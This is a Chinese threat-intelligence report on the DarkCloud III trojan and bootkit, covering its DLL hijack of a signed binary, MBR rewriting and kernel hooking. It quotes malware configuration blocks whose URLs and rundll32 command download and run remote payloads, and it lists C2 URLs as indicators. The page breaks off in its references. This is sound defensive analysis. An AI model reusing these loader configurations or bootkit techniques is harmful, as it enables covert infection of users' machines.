<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.38f62477280dcc27df9e.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2f45ca512d92831b456d.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.ddf9ea85dc483e3df228.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.ae682d6568221e03d161.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.55fb549cb8ff45291a32.js" rel="prefetch"><link href="/_nuxt/4.nuxt.bundle.34c699b301359d6a3c4d.js" rel="prefetch"><link href="/_nuxt/5.nuxt.bundle.1375829ca49ba88d696d.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 034fd8e0:0 ba3a09e0:0 c2ba7178:0 01cb4693:0 69b5e360:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}li{list-style-type:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{width:32px;height:32px;display:inline-block;margin:16px 32px;float:right;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACU0lEQVRYR+2XzZHaQBCFX48cAM4AStxNBmYzACSfDREYIjAbAcoA9mwkcARmM1jfocAZbADWPNfIDAtaCUmUXdhV6Cjm5+vX3Y+W4MqPXPl+XAzQWWxrSuvPJgCt1P2y23i+JJiLADqLbcuJ9RSCVnIp8RQ7arDsNp6qQlQG6IXrPiATIYTCoblQKAEFBDiKvOasCkRpgL3kEwH6BL5rpfo2YqOI0nomwDsCM63UqGxKSgGcSE4+xI4zTF9gAJ04DiDysUpKCgHSkhdJbNZXSUkuQJ7k+0inFHmMPDfIync6JZHnDvLqIhOgs9jWnVgvkio/kvxwMDkO/ebyXLFlpKS77DZ26T2vALz5ukORqQA1ggMreS/cmIrva6U6WQflwZh9AkwIPAs5SIOfAHjzTQDBJ3tY6LliJQfkR+i7SdtVfXrhZixAYloEgshzR/aMA0AvXK8E8h7kV4rUTUsZALMZ4K6o+M5BWQDTvuZckKvQb94lHmI3mugp2JnCsjAWQGm1mn9orKpGbtdbANHqTivdEqJu1cwswr8JkA7kBlCogOmCsr5+phWTLjA18P+lwP+ybf98g501nxdfQC0r4thxzD/hyVxw3AWVFUhfYp0ttyXJh9Bv9o9//9MAufn0wg0JPkZes30DuCnwTyoQK/U2bWqZTniYC8hueoA411L5XbBeCaUV+u4r78gEMOZDpb/Zjw6Ah6+e/axQN5Pv8ftkrUh7P/kcjIgird/TFe4jzx0XjmR2QQIh8ZCS7XhlZwMhDPwsb4YsHMvLXnTpuqsD/AKIkSQ/Gqk/IAAAAABJRU5ErkJggg==) no-repeat}.nav-bar .ico-home[data-v-42857612]:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACRElEQVRYR+2XT5LSQBTGvy9B13gDbmBuIJSJ65kTGKqEciecQOYEsJxKrII5gboVLJgbzNwAb8Aah7ypjmnMNPlLaaFV9DLV3e/3vvcnr4kTL57YPo4G8JfSfP6Aj8qBbQNXsw43xzhzFEDvmzggpiQcZVQEdxB0wze8qwtRG6D3XXwIxhRQLAyUQUaYCCEghuFrzupAVAZQkj/bYUzAB3AvEXztsVKEFpThlwLMftoYVg1JJQBD8putjYFpIM6JHSYA3tYJSSmAKXmZxGp/nZDkAuRJnng6heA28Kg8PlhmSEKX3by8yAR4v5TW7gGfkyzfS566eBS4/FKUbGZI7AYurztcm2cOAPoLuRBgSqApRFdL3p/LAIRv2bjIuigPJjk3FmBDoGuCPwHoLWRC4IO+LHBJLbkAP0KXcdnVXf25jMBfTQuCSeBxqO/YA/TmsiLxSgRfSbRUSSkAdVgsrMuSrwgqBXCflOoqdNmJe4g+GHsvWKvE0jAaIAJWnzyu6nqu92uASNCxAEeIllYzMwn/JoDpyBmgVAFVBVX7ekEpxlWgcuD/C8G7ubQbDax180n1hWamxxGG5lyQroLaCphGdGcrKMmbwKX6Ze/XnwbIjWd/ISKC29Bj+wxwVuCfVGBr44XZ1LI74e+54NIcIIpKKq8K4p8b4AQeD3pHJoBqPhaxjOcH9egg9q8eIp4VWub35N/eVpMPgPQDxVHTFQRXgcdR6UimNygIIn54ZHe86sPBhsQsb4YsHcur2zlu58kBHgGcWwk/vbbC3wAAAABJRU5ErkJggg==) no-repeat}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.article-page[data-v-8db87e62]{margin:0 auto;max-width:1108px;background-size:cover}.article-page .page-header[data-v-8db87e62]{border-bottom:1px solid #efefef}.article-page .page-header .ava img[data-v-8db87e62]{border-radius:50%;height:56px;width:56px;float:left;margin:12px}.article-page .page-header .title[data-v-8db87e62]{font-size:48px;color:#0b1802;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'"}.article-page .page-header .author[data-v-8db87e62]{display:inline-block;color:#979996;font-size:16px;font-family:"Verdana, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, Geneva, 'sans-serif'";margin:12px 7px 12px 0;line-height:16px}.article-page .page-header .author .ico-time img[data-v-8db87e62]{width:16px;height:16px}.article-page .main-body[data-v-8db87e62]{padding:0 108px;margin:28px auto 168px;background:url(/_nuxt/img/post-entry-bg.98216ca.png) no-repeat -10px 9px}.article-page .back-top[data-v-8db87e62]{width:48px;height:48px;position:fixed;bottom:30px;right:20px;background:url(/_nuxt/img/top.1d1a857.png) no-repeat}.article-page .back-top[data-v-8db87e62]:hover{cursor:pointer;background:url(/_nuxt/img/top-light.0cd636b.png) no-repeat}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer;max-height:32px;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section><div data-v-42857612><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><div class="ico-home" data-v-42857612></div></div><!----></div><div class="article-page" data-v-8db87e62><div class="page-header" data-v-8db87e62><div class="title-detail" data-v-552f8598 data-v-8db87e62>暗云III木马技术分析报告</div><div class="ava" data-v-8db87e62><img data-v-8db87e62></div><div class="tags" data-v-53a17526 data-v-8db87e62><p class="tag" data-v-53a17526>DARKCLOUD<p class="tag" data-v-53a17526>暗云3<p class="tag" data-v-53a17526>暗云</div><div class="author lh32" data-v-8db87e62>马茂刚 on</div></div><div class="main-body" data-v-8db87e62><h1 class="line" data-line="0">事件背景</h1><p class="line" data-line="2">2017年6月9日，关于一款名为“暗云III”木马的信息在互联网传播，据称此木马具有隐蔽性强、潜在危害大、传播范围广等特点。木马主要通过外挂、游戏辅助、私服登录器等传播，此类软件通常诱导用户关闭安全软件后使用，使得木马得以乘机植入。木马主要通过云控进行任务发布，传播及执行恶意功能时无文件写入磁盘，同时木马所具有的bootkit能力也使得木马的运行更加隐而且难以查杀。本报告对木马的相关技术进行分析，并提供解决方法和检查确认建议。<h2 class="line" data-line="4">目标样本</h2><p class="line" data-line="6">360威胁情报中心得到了如下木马相关的样本，相关的基本信息如下：</p><center><table><thead><tr><th><th><tbody><tr><td class="text-right"><strong>Hash</strong><td>BC5DEA3605878631B8FEEEB53BFB5B17<tr><td class="text-right"><strong>文件类型</strong><td>Win32 EXE<tr><td class="text-right"><strong>文件大小</strong><td>1669784字节<tr><td class="text-right"><strong>时间戳</strong><td>2016.12.24 16:52:15<tr><td class="text-right"><strong>首次上传VirusTotal时间</strong><td>2017-03-15 07:19:09 UTC<tr><td class="text-right"><strong>Hash</strong><td>518f9e5b1fb6397a27a0851930625049<tr><td class="text-right"><strong>文件类型</strong><td>Win32 EXE<tr><td class="text-right"><strong>文件大小</strong><td>48462字节<tr><td class="text-right"><strong>时间戳</strong><td>2016.12.16 19:56:11<tr><td class="text-right"><strong>首次上传VirusTotal时间</strong><td>2017-05-24 22:33:38 UTC</table></center><h2 class="line" data-line="23">样本分析</h2><h3 class="line" data-line="25">安装程序分析</h3><center><table><thead><tr><th><th><tbody><tr><td class="text-right"><strong>Hash</strong><td>BC5DEA3605878631B8FEEEB53BFB5B17<tr><td class="text-right"><strong>文件类型</strong><td>Win32 EXE<tr><td class="text-right"><strong>文件大小</strong><td>1669784字节<tr><td class="text-right"><strong>时间戳</strong><td>2016.12.24 16:52:15<tr><td class="text-right"><strong>首次上传VirusTotal时间</strong><td>2017-03-15 07:19:09 UTC</table></center><p class="line" data-line="37">样本功能：<p class="line" data-line="39">样本运行后显示正常游戏界面，会在后台解密payload，并在内存中动态到payload入口点执行，payload会搜集本机信息，拼接本机信息做为配置文件的下载地址，使用URLDownloadToFile下载配置文件，解析配置文件中的url字段、cmdline等字段，下载url字段中的内容并在内存中加载执行。<p class="line" data-line="41">样本运行，显示正常游戏界面：<p class="text-center line" data-line="43"><img src="/uploads/2017/07/25/8d3855a37f8ffd02687f20f6453d09d2.png" alt="" width="90%"><p class="line" data-line="45">使用CallWindowProcW注册窗口事件：<p class="text-center line" data-line="47"><img src="/uploads/2017/07/25/82fb7aa498073b3e2954ccae8cd970be.png" alt="" width="90%"><p class="line" data-line="49">在窗口处理函数中，查找89号资源，加载该图片资源，在该图片资源图片偏移ED7C的位置，保存着可以执行的代码：<p class="text-center line" data-line="51"><img src="/uploads/2017/07/25/5f9634e9176ef02f8ea69cb1b2350fd7.png" alt="" width="90%"><p class="line" data-line="53">将图片偏移ED7C处的代码复制到新申请的内存中。<p class="text-center line" data-line="55"><img src="/uploads/2017/07/25/741f41debd244b71db0a22d1a5f4c6a2.png" alt="" width="90%"><p class="line" data-line="57">这段代码包含两部分内容：<p class="text-center line" data-line="59"><img src="/uploads/2017/07/25/3e31f618818bf21ed704b04d4d8a4049.png" alt="" width="90%"><p class="line" data-line="61">运行这段代码时，首先会运行前面部分的shellcode内容，shellcode会使用RtlDecompressBuffer函数在内存中解压被压缩过的PE文件：<p class="text-center line" data-line="63"><img src="/uploads/2017/07/25/e7ea049d373a454193a95dad49ea0d20.png" alt="" width="90%"><p class="line" data-line="65">对解压缩出的PE文件进行内存动态加载后到入口点执行：<p class="text-center line" data-line="67"><img src="/uploads/2017/07/25/bd602bc9d44b44c728009b668ac44b87.png" alt="" width="90%"><p class="line" data-line="69">这个内存解密出来的样本的功能为：<p class="line" data-line="71">检测本机的环境（包括是否安装有360安全软件，是否是网吧环境，是否是虚拟机环境等），将收集到的客户端信息发送到http://c2tongji.b5156.com:89，服务器根据对本机环境做出判断返回不同内容。只有在满足特定环境的情况下，才会返回带有恶意下载链接的配置文件。而在木马的运行环境不符合木马作者的预期时，则不会返回恶意配置文件，以此来逃避安全软件查杀。<p class="line" data-line="73">检测虚拟机的代码片段：<p class="text-center line" data-line="75"><img src="/uploads/2017/07/25/54973d048e7febe6b07039866cae4eea.png" alt="" width="90%"><p class="line" data-line="77">检测360安全软件的代码片段：<p class="text-center line" data-line="79"><img src="/uploads/2017/07/25/e291e320f4497ac980561387b51413da.png" alt="" width="90%"><p class="line" data-line="81">检测是否是网吧环境的代码片段：<p class="text-center line" data-line="83"><img src="/uploads/2017/07/25/2c5253cef83ef09e1bc914411790624b.png" alt="" width="90%"><p class="line" data-line="85">搜集用户信息，通过URLDownloadToFile下载配置文件到本地：<p class="text-center line" data-line="87"><img src="/uploads/2017/07/25/7187ef685aaa1b25f1cce49994fa6c70.png" alt="" width="90%"><p class="line" data-line="89">下载回来的配置文件的格式为：<pre class="hljs"><code class="hljs">[Update] 

Version=2 
Url=http://update.njmmy.com:8089/config/LDrvSvc.zip 
CmdLine=rundll32.exe LDrvSvc.dll,RundllInstall 
Dir=%appdata%\\LDrvSvc
</code></pre><p class="line" data-line="100">随后对下载回来的配置文件进行解析后，使用CreateProcess加载从配置文件中URL字段的内容：<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/3a276293536a6aae76052c69bd5e0009.png" alt="" width="90%"><p class="line" data-line="104">此时下载的内容经过解密后在内存中执行，会尝试改写MBR。<h4 class="line" data-line="106">MBR的改写</h4><p class="line" data-line="108">此阶段木马的主要功能为：从上面的配置中下载回来的zip包中包含了驱动人生的白样本，木马利用驱动人生的白样本文件会尝试加载名为DtlCrashCatch.dll文件，而此文件是攻击者所提供的恶意代码，这是典型的白加黑绕过杀软的技巧，被国内恶意代码开发者所广泛使用。DtlCrashCatch.dll文件会从http://www.2tf1.com/upcfg.db 得到URL,从那个URL指向位置下载加密过的内容，在本地内存中解密后加载执行尝试修改用户计算机硬盘的MBR。<p class="line" data-line="110">被恶意利用的白签名文件：</p><center><table><thead><tr><th><th><tbody><tr><td class="text-right"><strong>Hash</strong><td>b3a4d017e51da2a3aef520d4836c6dc6<tr><td class="text-right"><strong>签名信息</strong><td>Shenzhen DriveTheLife Software Technology Co.Ltd</table></center><p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/1f3867e09ed33b793a5d289b29c97a5b.png" alt=""><p class="line" data-line="121">具体的过程为：<p class="line" data-line="123">通过调用“rundll32.exe LDrvSvc.dll,RundllInstall Dir=%appdata%\LDrvSvc”命令，将调用LDrvSvc.dll的RundllInstall函数,在RundllInstall函数中调用了HostInstall函数。<p class="text-center line" data-line="125"><img src="/uploads/2017/07/25/85b5ec0409f383567f0b1549b690dacb.png" alt=""><p class="line" data-line="127">而HostInstall函数会将在系统中注册LDrvSvc服务。<p class="text-center line" data-line="129"><img src="/uploads/2017/07/25/3d6bec505975067b32d8763a840beb0c.png" alt="" width="99%"><p class="line" data-line="131">随后以服务方式启动LDrvSvc.dll，这时会进入LDrvSvc.dll的ServiceMain函数。ServiceMain函数会加载DtlCrashCatch.dll文件<p class="text-center line" data-line="133"><img src="/uploads/2017/07/25/298ad7bf8935ff4ead3d9db5c196f408.png" alt="" width="90%"><p class="line" data-line="135">最终会调用DtlCrashCatch.dll的1001E889代码处：<p class="text-center line" data-line="137"><img src="/uploads/2017/07/25/e0518563c8f545b78b5f883786ca2eab.png" alt=""><p class="line" data-line="139">上述代码功能为通过CreateFileMapping和MappingViewOfFile解密指定尾部数据到一个共享内存，解密到共享内存中的代码shellcode，功能为调用RtlDecompressBuffer解密出PE并到PE入口点处执行。<p class="line" data-line="141">这个PE的功能为从http://www.2tf1.com/upcfg.db下载文件，将文件使用RC4算法解密，并判断下载回来的文件前4个字节是不是0xA5A5A5A5，如果满足条件则从解密后的第4个字节处开始执行。<p class="line" data-line="143">此处使用的RC4密钥的十六进制表示为：<blockquote><p>F4 70 75 3D 21 B7 D8 95 BE 49 48 C1 56 F6 A9 C1</blockquote><p class="line" data-line="147">下载配置文件代码片段：<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/c95671370be5e1961e9eeef2cfbf49cc.png" alt=""><p class="line" data-line="151">RC4解密后，比较0xA5A5A5A5代码片段：<p class="text-center line" data-line="153"><img src="/uploads/2017/07/25/2c2b82a1842430ea939c019fcae7d322.png" alt=""><p class="line" data-line="155">从解密出的代码+4处开始执行后，又会执行与前面类似的解密过程，先通过RtlDecompressBuffer解压缩代码后面部分压缩过的PE文件数据，随后动态加载PE后，到PE入口点执行。<p class="line" data-line="157">这时解压缩的代码片段：<p class="text-center line" data-line="159"><img src="/uploads/2017/07/25/ff178268784de66dbfc2e790fe8f0aba.png" alt="" width="90%"><p class="line" data-line="161">内存加载PE代码片段：<p class="text-center line" data-line="163"><img src="/uploads/2017/07/25/89ee096572aa2ca4e893c3ceccdafad7.png" alt="" width="90%"><p class="line" data-line="165">内存中加载的这个PE文件才是最终真正的修改MBR的PE。<p class="line" data-line="167">加载到内存后，判断ldrvsvc.dll模块的0x156C处是否为“0x8B 0x44 0x24 0x04 0x83 0xE8 0x01”（用来判断是不是已经被patch过），如果判断通过，就将ldrvsvc.dll模块的0x156C patch为”jmp 4C62D”：<p class="text-center line" data-line="169"><img src="/uploads/2017/07/25/ffebc399af572d163059cbd8801783cb.png" alt="" width="90%"><p class="line" data-line="171">用来对ldrvsvc.dll做patch的代码：<p class="text-center line" data-line="173"><img src="/uploads/2017/07/25/eaa5a92ca28ffa2585bb5b50f2cc0cb6.png" alt=""><p class="line" data-line="175">被patch后的ldrvsvc.dll，最终会被服务调用，进而执行写入MBR操作。为了防止对MBR的重复写入，木马在写入MBR操作前，会比较MBR是不是特征代码片段：<blockquote><p>31 C0 FA 31 DB 8E D3 36 89 26 FE 7B BC FE 7B 1E 66 60 8E DB 3E A1 13 04 24 FC 83 E8 40 3E A3 13</blockquote><p class="line" data-line="179">比较MBR是否已经被写入的代码片段：<p class="text-center line" data-line="181"><img src="/uploads/2017/07/25/e9919d54440cdbb858292dcc0706ec22.png" alt=""><p class="line" data-line="183">木马会把原始的MBR备份到系统第二扇区中，同时在第一扇区中写入恶意代码，在3-63扇区中写入加密过的恶意代码：<p class="text-center line" data-line="185"><img src="/uploads/2017/07/25/9303d0fa513bcc7f95d6a2610f3229a9.png" alt="" width="90%"><h4 class="line" data-line="187">Bootkit功能分析</h4><p class="line" data-line="189">bootkit功能主要：在内核以TDI 的方式访问网络下载shellcode解密后直接在内核中运行。木马在TDI层用udp连接访问ms.maimai666.com的8064端口获取shellcode。如果失败改用tcp连接ms.maimai666.com的8864获取。得到的内容会在内存中解密，解密后以APC的形式插入到应用层进程中。插入到应用层的代码功能主要为：根据配置文件从 http://www.acsewle.com:8877/ds/cl.db 下载加密后的文件，文件解密后的样本功能在下一小节中分析。<p class="line" data-line="191">由上一节对MBR写入过程的调试发现写入MBR后，系统第1个扇区的内容变为下图所示，这是木马的病毒代码：<p class="text-center line" data-line="193"><img src="/uploads/2017/07/25/71529405f6d1bac7201e01935973b684.png" alt=""><p class="line" data-line="195">系统第1扇区的代码功能为：将磁盘3-63扇区的木马主体加载到内存中解密执行。<p class="line" data-line="197">解密部分代码片段：<p class="text-center line" data-line="199"><img src="/uploads/2017/07/25/6c3762f4e13d6b9ae103399f3e440642.png" alt=""><p class="line" data-line="201">这部分解密代码的功能是：挂钩系统的15号中断，随后读取第二扇区中的备份MBR正常地引导系统启动。<p class="line" data-line="203">挂钩系统的15号中断代码片段：<p class="text-center line" data-line="205"><img src="/uploads/2017/07/25/3bd39c11abd44bf2895bdd954e50eeeb.png" alt=""><p class="line" data-line="207">挂钩成功后，使用第二扇区中备份的系统MBR正常地引导启动：<p class="text-center line" data-line="209"><img src="/uploads/2017/07/25/6fe270ce10943e6b8b4716e24f5546dc.png" alt=""><p class="line" data-line="211">INT 15中断向量被挂钩前后对比图：<p class="text-center line" data-line="213"><img src="/uploads/2017/07/25/7cb1bab3e81c2ef56c7a341beb23469b.png" alt=""><p class="line" data-line="215">随后，bootkit会挂钩BILoadImageEx函数、ntoskrnl入口点等。此外，木马还会根据磁盘类型和操作系统替换DriverStartIo、 AtapiHwStartIo、RaUnitStartIo等函数，从而阻止其他程序读取磁盘原始MBR。当检测到读MBR时，返回一个正常的MBR，检测到写MBR时，则直接忽略该操作。这就导致了系统中毒之后，如果木马作者没有打开云控开关的情况会，很难察觉电脑中毒。<p class="line" data-line="217">这样，当系统下次启动时，系统引导会通过int 15中断查询内存信息，此时挂钩15号中断的木马便得以第二次获得CPU控制权，获得控制权后木马挂钩BILoadImageEx函数，调用原始15号中断并将控制权交回给系统继续引导。<p class="line" data-line="219">当系统引导代码调用BILoadImageEx加载ntoskrnl.exe时，木马便第三次获得控制权，获得控制权后木马再一次执行挂钩操作，此次挂钩的位置是ntoskrnl.exe的入口点，随后将控制权交给系统继续引导。<p class="line" data-line="221">当引导完毕进入windows内核时，挂钩ntoskrnl入口点的木马代码第四次获得CPU控制权，此时木马已真正进入windows内核中，获得控制权后，分配一块内存空间，将木马内核的主功能代码拷贝到分配的空间中，并通过创建PsSetCreateThreadNotifyRoutine回调的方式使主功能代码得以执行。至此完成木马由MBR到windows内核的加载过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。<h3 class="line" data-line="223">Bootkit所加载木马的分析</h3><p class="line" data-line="225">对bootkit从云端加载的木马进行分析，文件基本信息：<table><thead><tr><th><th><tbody><tr><td><strong>Hash</strong><td>518f9e5b1fb6397a27a0851930625049<tr><td><strong>文件类型</strong><td>Win32 EXE<tr><td><strong>文件大小</strong><td>48462字节<tr><td><strong>时间戳</strong><td>2016.12.16 19:56:11<tr><td><strong>首次上传VirusTotal时间</strong><td>2017-05-24 22:33:38 UTC</table><p class="line" data-line="235">样本功能：<p class="line" data-line="237">访问http://www.acsewle.com:8877/ds/kn.html下载配置文件，解析配置文件中的appurl字段，下载appurl字段的url，根据配置文件中ispe为1，则通过CreateProcess直接加载执行。如果配置文件中ispe为0，则解析下载回来的非PE文件，RC4解密该非PE文件，得到PE加载代码与PE文件，以傀儡进程方式注入svchost.exe，，最后通过解密出来的PE加密代码加载解密出来的PE文件。<p class="line" data-line="239">细节如下：<p class="line" f020c369-7cd6-41ea-a91f-3c52f1b72d0b="" data-line="241">通过事件实现单一进程运行的，事件名：<p class="text-center line" data-line="243"><img src="/uploads/2017/07/25/ee925085321838256ca7379b7d541a5c.png" alt="" width="90%"><p class="line" data-line="245">下载配置文件到临时文件中：<p class="text-center line" data-line="247"><img src="/uploads/2017/07/25/ac003626642fae3c6d6fd7333b850b35.png" alt="" width="90%"><p class="line" data-line="249">访问http://www.acsewle.com:8877/ds/kn.html<p class="text-center line" data-line="251"><img src="/uploads/2017/07/25/1995c6346babc733157075ea21684beb.png" alt="" width="90%"><pre class="hljs"><code class="hljs">[Config] 

version = 890 
isexe = 0 
appurl = http://www.acsewle.com:8877/ds/lcdn.db
</code></pre><p class="line" data-line="261">解析CONFIG中的配置项目：<p class="text-center line" data-line="263"><img src="/uploads/2017/07/25/7c89e9c3ef5433b36e5e3d3a8b485eb0.png" alt="" width="90%"><p class="line" data-line="265">解析出 appurl后，会下载appurl的地址到临时文件。<p class="line" data-line="267">下载回来的代码如下：<p class="text-center line" data-line="269"><img src="/uploads/2017/07/25/8011249a08c35bcff43e61df03a865c6.png" alt="" width="90%"><p class="line" data-line="271">其中的格式为：<p class="line" data-line="273">前面8字节为“SLDREXEC”，标识字符，图中黑色框部分。绿色框部分为加密过的shellcode的长度。红色框部分为加密shellcode时使用的RC4密钥。褐色框部分为加密过的shellcode的内容。<p class="line" data-line="275">使用RC4算法将上面的褐色框部分解密后的内容分为两部分：<p class="line" data-line="277">第一部分为代码片段，用于动态加载PE文件<p class="line" data-line="279">第二部分为完整的PE文件，从文件偏移0x328处就是一个完整的PE文件。<p class="line" data-line="281">PE文件片段如下：<p class="text-center line" data-line="283"><img src="/uploads/2017/07/25/1b869ed9bd514c6c38358ca3f43d7a7a.png" alt=""><p class="line" data-line="285">解密出来的注入代码如下：<p class="text-center line" data-line="287"><img src="/uploads/2017/07/25/e99266a00fd896a3fa8c4170c2fb1524.png" alt=""><p class="line" data-line="289">将上面解密出的内容注入到svchost.exe中执行：<p class="text-center line" data-line="291"><img src="/uploads/2017/07/25/b3d8df3c0753fb1471a8d799438fc0fe.png" alt=""><p class="line" data-line="293">注入到svhost.exe中的代码包含上面所有的解密内容（包括代码片段与完整的PE文件）。<p class="line" data-line="295">代码片段的功能是动态获得函数地址，在内存中加载解密出的PE文件：<p class="text-center line" data-line="297"><img src="/uploads/2017/07/25/87dd47533d79cd2cf6f30413e34b0a03.png" alt=""><p class="line" data-line="299">内存加载PE并到入口点执行<p class="text-center line" data-line="301"><img src="/uploads/2017/07/25/aff38627a0c9b0bc69e7fa6ffafcffe3.png" alt=""><p class="line" data-line="303">Payload使用了UPX压缩。Payload的功能为，从网上下载lua脚本保存到临时文件，随后使用PE中内置的lua解析程序运行下载的lua脚本。<p class="line" data-line="305">从http://www.acsewle.com:8877/ld/ndn.db下载lua脚本到本地：<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/7c279c462a1596b8df87df2f5e2c222c.png" alt="" width="90%"><p class="line" data-line="309">使用PE中内置的lua解析器执行lua脚本：<p class="text-center line" data-line="311"><img src="/uploads/2017/07/25/9447657683fe2e8c03b9beb7405af3dc.png" alt="" width="90%"><p class="line" data-line="313">木马根据云端配置不同的lua脚本实现不同的功能。主要不同的lua的功能包括：统计受害机器信息功能，发动DDOS攻击功能，发起CC攻击功能等。<h2 class="line" data-line="315">解决方案</h2><p class="line" data-line="317">从以上的技术分析可以看到，暗云木马感染了MBR，即使重装系统，MBR里的恶意代码还会联网下载木马病毒执行。目前比较稳妥的解决办法是使用360急救箱的强力模式进行系统扫描，360急救箱强力模式会重启系统先于木马启动，从而彻底清除MBR中恶意代码，恢复系统正常MBR。<p class="line" data-line="319">360急救箱下载地址：<a href="http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip">http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip</a><h2 class="line" data-line="321">IOC</h2><p class="line" data-line="323">由于木马一旦感染会先于操作系统启动，在本地进行检查会变得非常困难，但由于木马有相对固定的网络行为，由于可以在网络出口尝试匹配如下URL及相应域名访问尝试，由可以比较有效低成本的发现中招系统。我们提供如下的URL IOC：<p class="line" data-line="325">http://www.acsewle.com:8877/ds/kn.html<p class="line" data-line="327">http://ms.maimai666.com<p class="line" data-line="329">http://www.acsewle.com:8877/ds/cl.db<p class="line" data-line="331">http://www.acsewle.com:8877/ds/lcdn.db<p class="line" data-line="333">http://www.acsewle.com:8877/ds/ndn.db<p class="line" data-line="335">http://www.2tf1.com/upcfg.db<p class="line" data-line="337">http://update.njmmy.com:8089/config/LDrvSvc.zip<p class="line" data-line="339">http://www.acsewle.com:8877/um.php<h2 class="line" data-line="341">参考信息</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li class="footnote-item" id="fn1"><p><a href="http://bbs.guanjia.qq.com/forum.php?mod=viewthread&tid=5307974">http://bbs.guanjia.qq.com/forum.php?mod=viewthread&tid=5307974</a> <a class="footnote-backref" href="#fnref1">↩︎</a><li class="footnote-item" id="fn2"><p><a 